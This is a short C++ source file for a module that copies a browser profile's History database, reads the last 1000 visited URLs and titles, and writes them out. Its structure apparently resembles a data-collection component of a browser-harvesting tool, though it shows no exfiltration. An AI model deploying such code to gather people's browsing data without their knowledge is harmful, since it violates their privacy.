//
// Created by .1qxz on 08.06.2024.
//

#include "CHistory.h"

void CHistory::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "History";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<std::unique_ptr<Entity>> history;

    SQLiteUtil::connectAndRead("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 0, 1000", copied_db, [&history](sqlite3_stmt *stmt) {
        auto historyRecord = std::make_unique<History>();
        historyRecord->url = SQLiteUtil::readString(stmt, 0);
        historyRecord->title = SQLiteUtil::readString(stmt, 1);

        history.push_back(std::move(historyRecord));
    });

    fs::remove(copied_db);
    Entity::writeSelf(root, history);
}